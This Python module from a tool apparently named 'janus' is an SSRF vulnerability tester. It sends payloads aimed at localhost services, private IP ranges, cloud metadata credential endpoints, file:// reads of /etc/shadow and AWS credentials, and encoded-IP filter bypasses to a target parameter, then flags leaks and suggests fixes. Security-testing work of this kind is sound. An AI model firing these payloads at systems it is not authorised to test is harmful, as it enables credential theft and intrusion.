# janus/attack/ssrf.py
"""
SSRF (Server-Side Request Forgery) Detection Module.

Tests for SSRF vulnerabilities by injecting various payloads
targeting internal services, cloud metadata endpoints, and
out-of-band DNS/HTTP callbacks.
"""

import requests
import re
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any
from datetime import datetime
import urllib.parse
import socket


@dataclass
class SSRFPayload:
    """A single SSRF test payload."""
    name: str
    payload: str
    category: str  # internal, cloud_metadata, file, dns_rebind
    severity: str
    description: str


@dataclass
class SSRFResult:
    """Result of an SSRF test."""
    endpoint: str
    parameter: str
    payload_name: str
    payload_value: str
    vulnerable: bool
    severity: str
    response_status: int
    response_length: int
    evidence: str
    recommendation: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "endpoint": self.endpoint,
            "parameter": self.parameter,
            "payload_name": self.payload_name,
            "payload_value": self.payload_value,
            "vulnerable": self.vulnerable,
            "severity": self.severity,
            "response_status": self.response_status,
            "response_length": self.response_length,
            "evidence": self.evidence,
            "recommendation": self.recommendation,
            "timestamp": self.timestamp
        }


class SSRFTester:
    """
    Server-Side Request Forgery (SSRF) vulnerability tester.
    
    Tests endpoints that accept URLs or hostnames for SSRF vulnerabilities
    by injecting payloads targeting internal networks, cloud metadata, 
    and external callback endpoints.
    """
    
    # Internal network payloads
    INTERNAL_PAYLOADS = [
        SSRFPayload(
            name="localhost_http",
            payload="http://localhost/",
            category="internal",
            severity="HIGH",
            description="Test access to localhost"
        ),
        SSRFPayload(
            name="localhost_admin",
            payload="http://localhost/admin",
            category="internal",
            severity="CRITICAL",
            description="Test access to localhost admin panel"
        ),
        SSRFPayload(
            name="127.0.0.1",
            payload="http://127.0.0.1/",
            category="internal",
            severity="HIGH",
            description="Test access to 127.0.0.1"
        ),
        SSRFPayload(
            name="localhost_port_scan_22",
            payload="http://127.0.0.1:22/",
            category="internal",
            severity="HIGH",
            description="Test SSH port access"
        ),
        SSRFPayload(
            name="localhost_port_scan_3306",
            payload="http://127.0.0.1:3306/",
            category="internal",
            severity="HIGH", 
            description="Test MySQL port access"
        ),
        SSRFPayload(
            name="localhost_port_scan_6379",
            payload="http://127.0.0.1:6379/",
            category="internal",
            severity="HIGH",
            description="Test Redis port access"
        ),
        SSRFPayload(
            name="internal_192.168",
            payload="http://192.168.1.1/",
            category="internal",
            severity="MEDIUM",
            description="Test access to internal 192.168.x.x range"
        ),
        SSRFPayload(
            name="internal_10.x",
            payload="http://10.0.0.1/",
            category="internal",
            severity="MEDIUM",
            description="Test access to internal 10.x.x.x range"
        ),
        SSRFPayload(
            name="internal_172.16",
            payload="http://172.16.0.1/",
            category="internal",
            severity="MEDIUM",
            description="Test access to internal 172.16.x.x range"
        ),
        SSRFPayload(
            name="ipv6_localhost",
            payload="http://[::1]/",
            category="internal",
            severity="HIGH",
            description="Test IPv6 localhost access"
        ),
    ]
    
    # Cloud metadata endpoint payloads
    CLOUD_PAYLOADS = [
        SSRFPayload(
            name="aws_metadata_v1",
            payload="http://169.254.169.254/latest/meta-data/",
            category="cloud_metadata",
            severity="CRITICAL",
            description="AWS EC2 Metadata Service v1"
        ),
        SSRFPayload(
            name="aws_metadata_iam",
            payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            category="cloud_metadata",
            severity="CRITICAL",
            description="AWS IAM credentials endpoint"
        ),
        SSRFPayload(
            name="aws_user_data",
            payload="http://169.254.169.254/latest/user-data/",
            category="cloud_metadata",
            severity="CRITICAL",
            description="AWS user data (may contain secrets)"
        ),
        SSRFPayload(
            name="gcp_metadata",
            payload="http://metadata.google.internal/computeMetadata/v1/",
            category="cloud_metadata",
            severity="CRITICAL",
            description="GCP Metadata Service"
        ),
        SSRFPayload(
            name="gcp_service_account",
            payload="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            category="cloud_metadata",
            severity="CRITICAL",
            description="GCP Service Account Token"
        ),
        SSRFPayload(
            name="azure_metadata",
            payload="http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            category="cloud_metadata",
            severity="CRITICAL",
            description="Azure Instance Metadata Service"
        ),
        SSRFPayload(
            name="digital_ocean_metadata",
            payload="http://169.254.169.254/metadata/v1/",
            category="cloud_metadata",
            severity="HIGH",
            description="DigitalOcean Metadata Service"
        ),
        SSRFPayload(
            name="alibaba_metadata",
            payload="http://100.100.100.200/latest/meta-data/",
            category="cloud_metadata",
            severity="CRITICAL",
            description="Alibaba Cloud Metadata Service"
        ),
    ]
    
    # File protocol payloads
    FILE_PAYLOADS = [
        SSRFPayload(
            name="file_etc_passwd",
            payload="file:///etc/passwd",
            category="file",
            severity="CRITICAL",
            description="Read /etc/passwd via file:// protocol"
        ),
        SSRFPayload(
            name="file_etc_shadow",
            payload="file:///etc/shadow",
            category="file",
            severity="CRITICAL",
            description="Read /etc/shadow via file:// protocol"
        ),
        SSRFPayload(
            name="file_windows_hosts",
            payload="file:///c:/windows/system32/drivers/etc/hosts",
            category="file",
            severity="HIGH",
            description="Read Windows hosts file"
        ),
        SSRFPayload(
            name="file_aws_creds",
            payload="file:///home/ec2-user/.aws/credentials",
            category="file",
            severity="CRITICAL",
            description="Read AWS credentials from EC2"
        ),
    ]
    
    # Bypass technique payloads
    BYPASS_PAYLOADS = [
        SSRFPayload(
            name="decimal_ip",
            payload="http://2130706433/",  # 127.0.0.1 in decimal
            category="bypass",
            severity="HIGH",
            description="Decimal IP encoding bypass"
        ),
        SSRFPayload(
            name="octal_ip",
            payload="http://0177.0.0.1/",  # 127.0.0.1 in octal
            category="bypass",
            severity="HIGH",
            description="Octal IP encoding bypass"
        ),
        SSRFPayload(
            name="hex_ip",
            payload="http://0x7f.0x00.0x00.0x01/",  # 127.0.0.1 in hex
            category="bypass",
            severity="HIGH",
            description="Hexadecimal IP encoding bypass"
        ),
        SSRFPayload(
            name="url_encoding",
            payload="http://127.0.0.1%2f",
            category="bypass",
            severity="HIGH",
            description="URL encoding bypass"
        ),
        SSRFPayload(
            name="double_url_encoding",
            payload="http://127.0.0.1%252f",
            category="bypass",
            severity="HIGH",
            description="Double URL encoding bypass"
        ),
        SSRFPayload(
            name="domain_redirect",
            payload="http://localtest.me/",  # Resolves to 127.0.0.1
            category="bypass",
            severity="HIGH",
            description="DNS rebinding via localtest.me"
        ),
        SSRFPayload(
            name="short_url_local",
            payload="http://127.1/",  # Short form of 127.0.0.1
            category="bypass",
            severity="HIGH",
            description="Short localhost notation"
        ),
    ]
    
    def __init__(self, timeout: int = 10, verify_ssl: bool = False):
        """
        Initialize the SSRF tester.
        
        Args:
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.all_payloads = (
            self.INTERNAL_PAYLOADS + 
            self.CLOUD_PAYLOADS + 
            self.FILE_PAYLOADS +
            self.BYPASS_PAYLOADS
        )
    
    def test_endpoint(
        self,
        endpoint: str,
        param_name: str,
        token: Optional[str] = None,
        method: str = "GET",
        base_body: Optional[Dict] = None,
        categories: Optional[List[str]] = None
    ) -> List[SSRFResult]:
        """
        Test an endpoint for SSRF vulnerabilities.
        
        Args:
            endpoint: Target endpoint URL
            param_name: Name of the URL/host parameter to test
            token: Authorization token
            method: HTTP method (GET, POST)
            base_body: Base request body for POST requests
            categories: Filter payloads by category
        
        Returns:
            List of SSRFResult findings
        """
        results = []
        
        # Filter payloads by category if specified
        payloads = self.all_payloads
        if categories:
            payloads = [p for p in payloads if p.category in categories]
        
        # Set up headers
        headers = {}
        if token:
            headers['Authorization'] = token
        
        # Test each payload
        for payload in payloads:
            result = self._test_single_payload(
                endpoint=endpoint,
                param_name=param_name,
                payload=payload,
                headers=headers,
                method=method,
                base_body=base_body
            )
            results.append(result)
        
        return results
    
    def _test_single_payload(
        self,
        endpoint: str,
        param_name: str,
        payload: SSRFPayload,
        headers: Dict[str, str],
        method: str,
        base_body: Optional[Dict]
    ) -> SSRFResult:
        """Test a single SSRF payload."""
        try:
            if method.upper() == "GET":
                # Add payload as query parameter
                sep = "&" if "?" in endpoint else "?"
                url = f"{endpoint}{sep}{param_name}={urllib.parse.quote(payload.payload)}"
                response = requests.get(
                    url, 
                    headers=headers, 
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False
                )
            else:
                # Add payload to request body
                body = base_body.copy() if base_body else {}
                body[param_name] = payload.payload
                response = requests.post(
                    endpoint,
                    json=body,
                    headers=headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False
                )
            
            # Analyze response for SSRF indicators
            vulnerable, evidence = self._analyze_response(response, payload)
            
            return SSRFResult(
                endpoint=endpoint,
                parameter=param_name,
                payload_name=payload.name,
                payload_value=payload.payload,
                vulnerable=vulnerable,
                severity=payload.severity if vulnerable else "INFO",
                response_status=response.status_code,
                response_length=len(response.content),
                evidence=evidence,
                recommendation=self._get_recommendation(payload) if vulnerable else ""
            )
            
        except requests.exceptions.Timeout:
            return SSRFResult(
                endpoint=endpoint,
                parameter=param_name,
                payload_name=payload.name,
                payload_value=payload.payload,
                vulnerable=True,  # Timeout could indicate internal network access
                severity="MEDIUM",
                response_status=0,
                response_length=0,
                evidence="Request timed out - possible internal network access",
                recommendation="Validate and whitelist allowed URLs/IPs"
            )
        except requests.exceptions.ConnectionError as e:
            # Connection errors to internal IPs could indicate attempted access
            is_internal = any(x in payload.payload for x in ['127.', '192.168.', '10.', '172.16'])
            return SSRFResult(
                endpoint=endpoint,
                parameter=param_name,
                payload_name=payload.name,
                payload_value=payload.payload,
                vulnerable=is_internal,
                severity="LOW" if is_internal else "INFO",
                response_status=0,
                response_length=0,
                evidence=f"Connection error: {str(e)[:100]}",
                recommendation=""
            )
        except Exception as e:
            return SSRFResult(
                endpoint=endpoint,
                parameter=param_name,
                payload_name=payload.name,
                payload_value=payload.payload,
                vulnerable=False,
                severity="INFO",
                response_status=0,
                response_length=0,
                evidence=f"Error: {str(e)[:100]}",
                recommendation=""
            )
    
    def _analyze_response(self, response: requests.Response, payload: SSRFPayload) -> tuple:
        """
        Analyze response for SSRF indicators.
        
        Returns:
            Tuple of (is_vulnerable, evidence_string)
        """
        content = response.text.lower()
        
        # Check for cloud metadata indicators
        if payload.category == "cloud_metadata":
            metadata_indicators = [
                "ami-id", "instance-id", "security-credentials",
                "access-key", "secret-access-key", "token",
                "metadata", "computemetadata", "instance/",
                "project/project-id", "instanceid"
            ]
            for indicator in metadata_indicators:
                if indicator in content:
                    return True, f"Cloud metadata exposed: found '{indicator}'"
        
        # Check for file content indicators
        if payload.category == "file":
            file_indicators = [
                "root:x:0:0:", "bin/bash", "bin/sh",
                "/home/", "administrator", "localhost",
                "[boot loader]", "[operating systems]"
            ]
            for indicator in file_indicators:
                if indicator.lower() in content:
                    return True, f"File content exposed: found '{indicator}'"
        
        # Check for internal service indicators
        if payload.category in ["internal", "bypass"]:
            internal_indicators = [
                "welcome to nginx", "apache", "tomcat",
                "phpinfo", "server at", "it works!",
                "default page", "internal", "intranet"
            ]
            for indicator in internal_indicators:
                if indicator in content:
                    return True, f"Internal service exposed: found '{indicator}'"
        
        # Check response status patterns
        if response.status_code == 200 and len(response.content) > 100:
            if payload.category == "cloud_metadata":
                return True, f"200 OK with content from metadata endpoint"
        
        # Check for error messages indicating attempted access
        ssrf_errors = [
            "connection refused", "host not found", "no route to host",
            "network unreachable", "connection timed out"
        ]
        for error in ssrf_errors:
            if error in content:
                return False, f"Target returned error: {error}"
        
        return False, "No SSRF indicators found"
    
    def _get_recommendation(self, payload: SSRFPayload) -> str:
        """Get remediation recommendation for a payload type."""
        recommendations = {
            "internal": "Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x). Use allowlist for permitted domains.",
            "cloud_metadata": "Block access to 169.254.169.254 and cloud metadata endpoints. Use IMDSv2 on AWS which requires token headers.",
            "file": "Disable file:// protocol handler. Whitelist only http/https protocols.",
            "bypass": "Implement robust URL parsing and validation. Canonicalize URLs before validation. Block all private IP ranges including encoded forms."
        }
        return recommendations.get(payload.category, "Implement URL validation and allowlisting")
    
    def quick_scan(
        self,
        endpoint: str,
        param_name: str,
        token: Optional[str] = None
    ) -> List[SSRFResult]:
        """
        Run a quick SSRF scan with the most critical payloads.
        
        Args:
            endpoint: Target endpoint
            param_name: URL parameter name
            token: Authorization token
        
        Returns:
            List of findings
        """
        critical_payloads = [
            p for p in self.all_payloads 
            if p.severity == "CRITICAL" or p.name in ["localhost_http", "127.0.0.1"]
        ]
        
        results = []
        headers = {"Authorization": token} if token else {}
        
        for payload in critical_payloads[:10]:  # Limit for speed
            result = self._test_single_payload(
                endpoint=endpoint,
                param_name=param_name,
                payload=payload,
                headers=headers,
                method="GET",
                base_body=None
            )
            results.append(result)
        
        return results
    
    def generate_report(self, results: List[SSRFResult]) -> Dict[str, Any]:
        """
        Generate a summary report from SSRF test results.
        
        Args:
            results: List of SSRFResult findings
        
        Returns:
            Summary report dictionary
        """
        vulnerable = [r for r in results if r.vulnerable]
        
        by_category = {}
        for r in vulnerable:
            payload = next((p for p in self.all_payloads if p.name == r.payload_name), None)
            if payload:
                cat = payload.category
                if cat not in by_category:
                    by_category[cat] = []
                by_category[cat].append(r)
        
        return {
            "total_tests": len(results),
            "vulnerable_count": len(vulnerable),
            "critical_count": len([r for r in vulnerable if r.severity == "CRITICAL"]),
            "high_count": len([r for r in vulnerable if r.severity == "HIGH"]),
            "by_category": {k: len(v) for k, v in by_category.items()},
            "findings": [r.to_dict() for r in vulnerable]
        }
